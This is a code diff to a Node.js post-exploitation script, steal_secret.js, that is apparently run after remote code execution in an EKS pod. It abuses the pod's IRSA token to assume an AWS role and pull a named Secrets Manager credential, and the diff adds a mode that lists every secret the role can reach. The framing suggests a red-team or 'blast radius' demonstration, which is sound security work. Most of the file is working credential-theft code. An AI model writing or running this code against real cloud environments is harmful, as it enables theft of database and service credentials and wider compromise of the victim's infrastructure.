@@ -8,13 +8,16 @@
 // needs node (already running `next dev`) and the IRSA env vars the EKS
 // webhook injects.
 //
-// Usage (from the RCE): node /tmp/steal_secret.js <secret-id>
+// Usage (from the RCE):
+//   node /tmp/steal_secret.js [secret-id]   # get one secret (default mode)
+//   node /tmp/steal_secret.js --list        # list all secrets (blast radius)
 
 const fs = require("fs");
 const https = require("https");
 const crypto = require("crypto");
 
-const SECRET_ID = process.argv[2] || "react2shell-eks-dev-rds-credential";
+const args = process.argv.slice(2).filter((a) => a !== "--list");
+const SECRET_ID = args[0] || "react2shell-eks-dev-rds-credential";
 const REGION =
   process.env.AWS_REGION || process.env.AWS_DEFAULT_REGION || "ca-central-1";
 const ROLE_ARN = process.env.AWS_ROLE_ARN;
@@ -84,12 +87,12 @@ async function assumeRole() {
   };
 }
 
-// 2) Secrets Manager GetSecretValue (SigV4-signed POST).
-async function getSecret(creds) {
+// 2) Secrets Manager call, SigV4-signed POST. Generic over the API target so
+//    GetSecretValue and ListSecrets share one signer.
+async function smCall(creds, target, bodyObj) {
   const service = "secretsmanager";
   const host = `${service}.${REGION}.amazonaws.com`;
-  const target = "secretsmanager.GetSecretValue";
-  const payload = JSON.stringify({ SecretId: SECRET_ID });
+  const payload = JSON.stringify(bodyObj);
 
   const now = new Date();
   const amzDate = now.toISOString().replace(/[:-]|\.\d{3}/g, ""); // YYYYMMDDTHHMMSSZ
@@ -149,17 +152,29 @@ async function getSecret(creds) {
   return res.body;
 }
 
+const getSecret = (creds) =>
+  smCall(creds, "secretsmanager.GetSecretValue", { SecretId: SECRET_ID });
+
+// Blast-radius demo: list EVERY secret the broad role can see, proving the
+// stolen creds reach far beyond the one intended secret.
+const listSecrets = (creds) =>
+  smCall(creds, "secretsmanager.ListSecrets", { MaxResults: 100 });
+
 (async () => {
   try {
     if (!ROLE_ARN || !TOKEN_FILE) {
       console.error("No IRSA env (AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE).");
       process.exit(1);
     }
-    console.error(`[*] role=${ROLE_ARN} region=${REGION} secret=${SECRET_ID}`);
+    const mode = process.argv[2] === "--list" ? "list" : "get";
+    console.error(
+      `[*] role=${ROLE_ARN} region=${REGION} mode=${mode}` +
+        (mode === "get" ? ` secret=${SECRET_ID}` : "")
+    );
     const creds = await assumeRole();
     console.error(`[*] assumed role, akid=${creds.accessKeyId}`);
-    const secret = await getSecret(creds);
-    console.log(secret);
+    const out = mode === "list" ? await listSecrets(creds) : await getSecret(creds);
+    console.log(out);
   } catch (e) {
     console.error("[!] " + (e && e.stack ? e.stack : e));
     process.exit(1);
